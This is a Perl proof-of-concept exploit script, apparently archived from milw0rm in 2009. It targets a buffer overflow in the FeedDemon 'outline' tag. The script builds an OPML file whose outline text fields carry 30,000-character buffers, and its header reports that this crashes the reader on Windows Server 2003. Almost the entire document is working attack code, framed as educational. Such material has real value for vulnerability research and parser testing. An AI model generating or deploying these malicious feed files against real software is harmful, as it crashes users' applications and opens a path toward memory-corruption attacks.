#!usr/bin/perl -w

################################################################################
#     Reference:
#        http://security.bkis.vn/?p=329
#        http://www.securityfocus.com/bid/33630/info
#
#    Tested on Windows Server 2003 with FeedMon 2.7.0.0. FeedMon crashes
#    whenever I am trying to Unsubscribe from the malicious(overlylong) feed.
#
#     Thanx to milw0rm, str0ke, security.bkis, @rp m@n, evilfingers
#    and all security researchers.
#
#$$$$$ This was strictly written for educational purpose. Use it at
#$$$$$ your own risk. Author will not bare any responsibility for any
#$$$$$ damages watsoever.
#
#####MOST OF THE CODE I GOT FROM###############################################
#####http://search.cpan.org/~madghoul/XML-OPML-0.26/OPML.pm####################
#
#    Author: Praveen Dar$hanam
#    Visit:
#        http://www.darshanams.blogspot.com/
#        http://www.evilfingers.com/
################################################################################

use XML::OPML;
print "OPML is working fine\n\n";

 my $opml = new XML::OPML(version => "1.1");

 $opml->head(
             title => 'FeedDemon \'outline\' Tag Buffer Overflow Vulnerability PoC',
             dateCreated => 'Thur, 05 Feb 2009 8.55:35:00 IST',
             ownerName => 'Praveen Darshanam',
             ownerEmail => 'praveen_recker@sify.com',
             expansionState => '',
             vertScrollState => '',
             windowTop => '',
             windowLeft => '',
             windowBottom => '',
             windowRight => '',
           );

 $buff="D" x 30000;
 # Malicious buffer which creates overly long text tag

 $opml->add_outline(
                 description => 'Warren Ellis\' Personal Weblog',
                 title => 'Warren Ellis Speaks Clever',
                 text => $buff,
                 type => 'rss',
                 version => 'RSS',
                 htmlUrl => 'http://www.diepunyhumans.com ',
                 xmlUrl => 'http://www.diepunyhumans.com/index.rdf ',
               );

 $opml->add_outline(
                 descriptions => 'The raelity bytes weblog.',
                 title => 'raelity bytes',
                 text => $buff,
                 type => 'rss',
                 version => 'RSS',
                 htmlUrl => 'http://www.raelity.org ',
                 xmlUrl => 'http://www.raelity.org/index.rss10 ',
               );

 $opml->save('malicious_files.opml');

# milw0rm.com [2009-02-05]
